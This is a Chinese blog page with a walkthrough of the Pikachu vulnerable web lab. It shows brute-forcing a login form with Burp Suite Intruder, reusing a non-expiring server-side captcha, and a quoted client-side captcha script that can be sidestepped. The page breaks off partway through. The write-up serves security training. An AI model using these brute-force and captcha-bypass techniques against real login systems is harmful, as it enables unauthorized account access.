<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Pikachu靶场 | Zephyr&#39;s Repository</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <meta name="description" content="Repository">
    <meta name="keywords" content="Personal blog">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.2ceecd60.css" as="style"><link rel="preload" href="/assets/js/app.d666345c.js" as="script"><link rel="preload" href="/assets/js/2.2caa9fc9.js" as="script"><link rel="preload" href="/assets/js/8.a8e385a7.js" as="script"><link rel="prefetch" href="/assets/js/10.92253112.js"><link rel="prefetch" href="/assets/js/100.6b2ae977.js"><link rel="prefetch" href="/assets/js/101.aacea51d.js"><link rel="prefetch" href="/assets/js/102.174cc836.js"><link rel="prefetch" href="/assets/js/103.ff1ebaa1.js"><link rel="prefetch" href="/assets/js/104.69cf1cf6.js"><link rel="prefetch" href="/assets/js/105.9594a7fc.js"><link rel="prefetch" href="/assets/js/106.99a74775.js"><link rel="prefetch" href="/assets/js/107.8f78b1ec.js"><link rel="prefetch" href="/assets/js/108.c24a6aa0.js"><link rel="prefetch" href="/assets/js/109.b7acd6b5.js"><link rel="prefetch" href="/assets/js/11.8fa5d5cf.js"><link rel="prefetch" href="/assets/js/110.2c0dad37.js"><link rel="prefetch" href="/assets/js/111.0fe328f6.js"><link rel="prefetch" href="/assets/js/12.72be6f01.js"><link rel="prefetch" href="/assets/js/13.ff9c04cb.js"><link rel="prefetch" href="/assets/js/14.96414c99.js"><link rel="prefetch" href="/assets/js/15.1e9eb50e.js"><link rel="prefetch" href="/assets/js/16.e1e06856.js"><link rel="prefetch" href="/assets/js/17.0278769e.js"><link rel="prefetch" href="/assets/js/18.bb972816.js"><link rel="prefetch" href="/assets/js/19.79cd2b85.js"><link rel="prefetch" href="/assets/js/20.7fb5caaa.js"><link rel="prefetch" href="/assets/js/21.88af962e.js"><link rel="prefetch" href="/assets/js/22.31db3d38.js"><link rel="prefetch" href="/assets/js/23.a5f143ad.js"><link rel="prefetch" href="/assets/js/24.8710ce7b.js"><link rel="prefetch" href="/assets/js/25.b8c57ad3.js"><link rel="prefetch" href="/assets/js/26.c2316678.js"><link rel="prefetch" href="/assets/js/27.21bfe439.js"><link rel="prefetch" href="/assets/js/28.96768776.js"><link rel="prefetch" href="/assets/js/29.61870f84.js"><link rel="prefetch" href="/assets/js/3.9154aee4.js"><link rel="prefetch" href="/assets/js/30.9804accb.js"><link rel="prefetch" href="/assets/js/31.1a0d56cd.js"><link rel="prefetch" href="/assets/js/32.e58ac650.js"><link rel="prefetch" href="/assets/js/33.45642796.js"><link rel="prefetch" href="/assets/js/34.64cc442a.js"><link rel="prefetch" href="/assets/js/35.618d79bb.js"><link rel="prefetch" href="/assets/js/36.01777eb4.js"><link rel="prefetch" href="/assets/js/37.13567851.js"><link rel="prefetch" href="/assets/js/38.357bc63e.js"><link rel="prefetch" href="/assets/js/39.4e1b9673.js"><link rel="prefetch" href="/assets/js/4.d29e359d.js"><link rel="prefetch" href="/assets/js/40.86012f62.js"><link rel="prefetch" href="/assets/js/41.38072a3c.js"><link rel="prefetch" href="/assets/js/42.fcacbd34.js"><link rel="prefetch" href="/assets/js/43.9a17609e.js"><link rel="prefetch" href="/assets/js/44.24b6f963.js"><link rel="prefetch" href="/assets/js/45.08f58277.js"><link rel="prefetch" href="/assets/js/46.1e9937f1.js"><link rel="prefetch" href="/assets/js/47.4346f70c.js"><link rel="prefetch" href="/assets/js/48.666ffad3.js"><link rel="prefetch" href="/assets/js/49.f71696c0.js"><link rel="prefetch" href="/assets/js/5.88d932c8.js"><link rel="prefetch" href="/assets/js/50.f6a0b6cc.js"><link rel="prefetch" href="/assets/js/51.e9183b21.js"><link rel="prefetch" href="/assets/js/52.9613803c.js"><link rel="prefetch" href="/assets/js/53.84e49fd8.js"><link rel="prefetch" href="/assets/js/54.27481140.js"><link rel="prefetch" href="/assets/js/55.c54d404d.js"><link rel="prefetch" href="/assets/js/56.9b4cfda1.js"><link rel="prefetch" href="/assets/js/57.9cc88303.js"><link rel="prefetch" href="/assets/js/58.b93735fe.js"><link rel="prefetch" href="/assets/js/59.fb6687b9.js"><link rel="prefetch" href="/assets/js/6.64c53d2e.js"><link rel="prefetch" href="/assets/js/60.d8c853ad.js"><link rel="prefetch" href="/assets/js/61.3181365c.js"><link rel="prefetch" href="/assets/js/62.f80f35d7.js"><link rel="prefetch" href="/assets/js/63.298c8979.js"><link rel="prefetch" href="/assets/js/64.0172751d.js"><link rel="prefetch" href="/assets/js/65.279a288b.js"><link rel="prefetch" href="/assets/js/66.ea6dbf7d.js"><link rel="prefetch" href="/assets/js/67.3c2ccb8c.js"><link rel="prefetch" href="/assets/js/68.70c6a2a6.js"><link rel="prefetch" href="/assets/js/69.1a64a917.js"><link rel="prefetch" href="/assets/js/7.ea40bec5.js"><link rel="prefetch" href="/assets/js/70.0f03e3cf.js"><link rel="prefetch" href="/assets/js/71.db8f5035.js"><link rel="prefetch" href="/assets/js/72.8b671082.js"><link rel="prefetch" href="/assets/js/73.989a9a9a.js"><link rel="prefetch" href="/assets/js/74.7dbf53ff.js"><link rel="prefetch" href="/assets/js/75.fdc863e8.js"><link rel="prefetch" href="/assets/js/76.8335c5ef.js"><link rel="prefetch" href="/assets/js/77.dff2cd27.js"><link rel="prefetch" href="/assets/js/78.20d1110f.js"><link rel="prefetch" href="/assets/js/79.da829f37.js"><link rel="prefetch" href="/assets/js/80.38b5183d.js"><link rel="prefetch" href="/assets/js/81.31779399.js"><link rel="prefetch" href="/assets/js/82.9ab0f199.js"><link rel="prefetch" href="/assets/js/83.11386321.js"><link rel="prefetch" href="/assets/js/84.b40c9cc1.js"><link rel="prefetch" href="/assets/js/85.3dd4c8d9.js"><link rel="prefetch" href="/assets/js/86.eef59cd4.js"><link rel="prefetch" href="/assets/js/87.54f35730.js"><link rel="prefetch" href="/assets/js/88.23a1baf9.js"><link rel="prefetch" href="/assets/js/89.e0269eb9.js"><link rel="prefetch" href="/assets/js/9.bc75a509.js"><link rel="prefetch" href="/assets/js/90.ba9d185a.js"><link rel="prefetch" href="/assets/js/91.407950b3.js"><link rel="prefetch" href="/assets/js/92.c8d2a800.js"><link rel="prefetch" href="/assets/js/93.55f6068b.js"><link rel="prefetch" href="/assets/js/94.fc44432d.js"><link rel="prefetch" href="/assets/js/95.cbc9e839.js"><link rel="prefetch" href="/assets/js/96.3f99bde9.js"><link rel="prefetch" href="/assets/js/97.5acc4bc2.js"><link rel="prefetch" href="/assets/js/98.31446065.js"><link rel="prefetch" href="/assets/js/99.2a27e19f.js">
    <link rel="stylesheet" href="/assets/css/0.styles.2ceecd60.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="Zephyr's Repository" class="logo"> <span class="site-name can-hide">Zephyr's Repository</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/course/" class="nav-link">笔记</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术</a></div><div class="nav-item"><a href="/more/" class="nav-link">更多</a></div><div class="nav-item"><a href="/favorites/" class="nav-link">收藏</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">📂 分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">🏷️ 标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">📅 归档</a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/Zephyr.jpg"> <div class="blogger-info"><h3>Zephyr</h3> <span>偷得浮生半日闲</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/course/" class="nav-link">笔记</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术</a></div><div class="nav-item"><a href="/more/" class="nav-link">更多</a></div><div class="nav-item"><a href="/favorites/" class="nav-link">收藏</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">📂 分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">🏷️ 标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">📅 归档</a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Web</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/2e1547494524d1d2/" aria-current="page" class="active sidebar-link">Pikachu靶场</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#基于表单的暴力破解" class="sidebar-link">基于表单的暴力破解</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#验证码绕过-on-server" class="sidebar-link">验证码绕过（on Server）</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#验证码绕过-on-clinet" class="sidebar-link">验证码绕过（on Clinet）</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#token防爆破" class="sidebar-link">token防爆破</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#反射型xss-get" class="sidebar-link">反射型XSS(get)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#反射型xss-post" class="sidebar-link">反射型XSS(post)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#存储型xss" class="sidebar-link">存储型XSS</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#dom型xss" class="sidebar-link">DOM型XSS</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#dom型xss-x" class="sidebar-link">DOM型XSS-X</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xss之盲打" class="sidebar-link">XSS之盲打</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xss的过滤" class="sidebar-link">XSS的过滤</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xss之htmlspecialchars" class="sidebar-link">XSS之htmlspecialchars</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1d2/#htmlspecialchars函数" class="sidebar-link">htmlspecialchars函数</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xss之href输出" class="sidebar-link">xss之href输出</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xss之js输出" class="sidebar-link">xss之js输出</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#csrf-get" class="sidebar-link">CSRF(get)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#csrf-post" class="sidebar-link">CSRF(post)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#csrf-token" class="sidebar-link">CSRF Token</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#数字型注入-post" class="sidebar-link">数字型注入(post)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#字符型注入-get" class="sidebar-link">字符型注入(get)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#搜索型注入" class="sidebar-link">搜索型注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xx型注入" class="sidebar-link">xx型注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#insert-update-注入" class="sidebar-link">&quot;insert/update&quot;注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#delete-注入" class="sidebar-link">&quot;delete&quot;注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#http头注入" class="sidebar-link">http头注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#盲注-base-on-boolian" class="sidebar-link">盲注(base on boolian)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#盲注-base-on-time" class="sidebar-link">盲注(base on time)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#宽字节注入" class="sidebar-link">宽字节注入</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#exec-ping" class="sidebar-link">exec &quot;ping&quot;</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#exec-evel" class="sidebar-link">exec &quot;evel&quot;</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#file-inclusion-local" class="sidebar-link">File Inclusion(local)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#file-inclusion-remote" class="sidebar-link">File Inclusion(remote)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#client-check" class="sidebar-link">client check</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#mime-type" class="sidebar-link">MIME type</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#getimagesize" class="sidebar-link">getimagesize</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#水平越权" class="sidebar-link">水平越权</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#垂直越权" class="sidebar-link">垂直越权</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#目录遍历" class="sidebar-link">目录遍历</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#icanseeyouabc" class="sidebar-link">Icanseeyouabc</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#xxe漏洞" class="sidebar-link">XXE漏洞</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/2e1547494524d1d2/#概述" class="sidebar-link">概述</a></li></ul></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#不安全的url跳转" class="sidebar-link">不安全的url跳转</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ssrf-curl" class="sidebar-link">SSRF(curl)</a></li><li class="sidebar-sub-header level2"><a href="/pages/2e1547494524d1d2/#ssrf-file-get-content" class="sidebar-link">SSRF(filegetcontent)</a></li></ul></li><li><a href="/pages/2e1547494524d1c8/" class="sidebar-link">SUCTF 2019 CheckIn</a></li><li><a href="/pages/2e1547494524d1c9/" class="sidebar-link">GXYCTF 2019 BabySQli</a></li><li><a href="/pages/2e1547494524d1ca/" class="sidebar-link">GYCTF 2020 Blacklist</a></li><li><a href="/pages/2e1547494524d1cc/" class="sidebar-link">RoarCTF 2019 Easy Java</a></li><li><a href="/pages/2e1547494524d1d1/" class="sidebar-link">CISCN 2019 初赛 Love</a></li><li><a href="/pages/2e1547494524d1d3/" class="sidebar-link">0CTF 2016 piapiapia</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>PWN</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/course/#笔记" data-v-06225672>笔记</a></li><li data-v-06225672><a href="/course/#Web" data-v-06225672>Web</a></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="javascript:;" data-v-06225672>Zephyr</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2022-07-01</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">Pikachu靶场<!----></h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><h1 id="burte-force"><a href="#burte-force" class="header-anchor">#</a> Burte Force</h1> <h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="header-anchor">#</a> 基于表单的暴力破解</h2> <p>BrupSuite抓包，发到Intruder</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu1.png" alt="pikachu1"></p> <p>username和password设为变量，使用Cluster bomb模式进行爆破</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu2.png" alt="pikachu2"></p> <p>账号为：admin，密码为：123456</p> <h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="header-anchor">#</a> 验证码绕过（on Server）</h2> <p>抓包发到Repeater，手动修改两次username和password，不更改验证码</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu3.png" alt="pikachu3"></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu4.png" alt="pikachu4"></p> <p>Response返回并未提示验证码错误，说明验证码后台不过期，可以重复使用，接下来重复上一节即可。</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu5.png" alt="pikachu5"></p> <p>爆破成功，账号为：admin，密码为：123456</p> <h2 id="验证码绕过-on-clinet"><a href="#验证码绕过-on-clinet" class="header-anchor">#</a> 验证码绕过（on Clinet）</h2> <p>BrupSuite开启抓包，提交错误的验证码，发现没有新的数据包发往服务器，但网页还是提示验证码错误</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu6.png" alt="pikachu6"></p> <p>查看网页源码，发现验证码部分是前端验证，代码如下</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>    <span class="token keyword">var</span> code<span class="token punctuation">;</span> <span class="token comment">//在全局 定义验证码</span>
    <span class="token keyword">function</span> <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        code <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> codeLength <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token comment">//验证码的长度</span>
        <span class="token keyword">var</span> checkCode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;checkCode&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> selectChar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//所有候选组成验证码的字符，当然也可以用中文的</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> codeLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> charIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            code <span class="token operator">+=</span> selectChar<span class="token punctuation">[</span>charIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//alert(code);</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>checkCode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            checkCode<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">&quot;code&quot;</span><span class="token punctuation">;</span>
            checkCode<span class="token punctuation">.</span>value <span class="token operator">=</span> code<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> inputCode <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#bf_client .vcode'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>inputCode<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;请输入验证码！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>inputCode <span class="token operator">!=</span> code<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;验证码输入错误！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//刷新验证码</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">createCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span 